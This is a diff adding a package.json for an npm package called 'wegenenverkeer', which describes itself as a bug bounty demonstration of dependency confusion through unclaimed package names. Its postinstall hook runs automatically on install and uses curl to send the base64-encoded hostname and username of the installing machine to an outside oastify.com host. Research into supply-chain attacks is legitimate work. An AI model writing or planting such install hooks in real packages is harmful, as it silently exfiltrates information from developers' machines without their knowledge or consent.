@@ -1,0 +1,11 @@
+{
+  "name": "wegenenverkeer",
+  "version": "1.0.0",
+  "description": "This package was created for a bug bounty program to demonstrate a security vulnerability related to unclaimed NPM packages.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "curl -X POST -d \"info=$(echo $(hostname && whoami) | base64)\" http://4uzf6949owus0bn4vwkcdbwwzn5et6hv.oastify.com"
+  },
+  "author": "Unknown",
+  "license": "ISC"
+}
